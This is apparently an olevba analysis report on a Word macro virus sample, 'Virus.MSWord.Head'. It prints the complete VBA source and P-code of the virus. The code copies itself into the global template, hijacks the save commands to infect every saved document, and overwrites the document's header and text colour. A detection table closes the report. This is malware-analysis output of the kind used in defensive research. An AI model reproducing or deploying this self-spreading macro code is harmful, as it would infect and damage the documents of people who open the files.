olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Head
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Head - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Head - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim f$
Dim Success
f$ = WordBasic.[FileName$]()
WordBasic.MacroCopy f$ + ":AutoOpen", "Global:ao"
WordBasic.MacroCopy f$ + ":fsa", "Global:FileSaveAs"
WordBasic.MacroCopy f$ + ":fs", "Global:FileSave"
WordBasic.EditSelectAll
WordBasic.FormatFont Color:=7
WordBasic.StartOfDocument
Success = WordBasic.ViewHeader()
If Not Success Then WordBasic.ViewHeader
WordBasic.EditSelectAll
WordBasic.Insert "Your document was infected by a very dangerous virus!"
WordBasic.ViewHeader
End Sub
-------------------------------------------------------------------------------
VBA MACRO fsa.bas 
in file: Virus.MSWord.Head - OLE stream: 'Macros/VBA/fsa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.fsa.MAIN"
Dim f$
On Error GoTo -1: On Error GoTo Abort
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
f$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "Global:FileSaveAs", f$ + ":fsa"
WordBasic.MacroCopy "Global:FileSave", f$ + ":fs"
WordBasic.MacroCopy "Global:ao", f$ + ":AutoOpen"
WordBasic.FileSave
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO fs.bas 
in file: Virus.MSWord.Head - OLE stream: 'Macros/VBA/fs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.fs.MAIN"
Dim f$
WordBasic.FileSave
f$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=f$, Format:=1, AddToMru:=0
WordBasic.MacroCopy "Global:FileSaveAs", f$ + ":fsa"
WordBasic.MacroCopy "Global:FileSave", f$ + ":fs"
WordBasic.MacroCopy "Global:ao", f$ + ":AutoOpen"
WordBasic.FileSave
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Head
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2451 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Dim 
' 	VarDefn Success
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #5:
' 	Ld False$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x0009 "Global:ao"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #6:
' 	Ld False$ 
' 	LitStr 0x0004 ":fsa"
' 	Add 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	Ld False$ 
' 	LitStr 0x0003 ":fs"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #9:
' 	LitDI2 0x0007 
' 	ParamNamed Color 
' 	Ld WordBasic 
' 	ArgsMemCall FormatFont 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemCall StartOfDocument 0x0000 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd ViewHeader 0x0000 
' 	St Success 
' Line #12:
' 	Ld Success 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemCall ViewHeader 0x0000 
' 	EndIf 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall EditSelectAll 0x0000 
' Line #14:
' 	LitStr 0x0035 "Your document was infected by a very dangerous virus!"
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #15:
' 	Ld WordBasic 
' 	ArgsMemCall ViewHeader 0x0000 
' Line #16:
' 	EndSub 
' Macros/VBA/fsa - 1947 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #4:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #5:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #10:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld False$ 
' 	LitStr 0x0004 ":fsa"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #11:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld False$ 
' 	LitStr 0x0003 ":fs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	LitStr 0x0009 "Global:ao"
' 	Ld False$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #14:
' 	Label Abort 
' Line #15:
' 	EndSub 
' Macros/VBA/fs - 1645 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #5:
' 	Ld False$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed AddToMru 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0003 
' Line #6:
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld False$ 
' 	LitStr 0x0004 ":fsa"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #7:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld False$ 
' 	LitStr 0x0003 ":fs"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	LitStr 0x0009 "Global:ao"
' 	Ld False$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #10:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

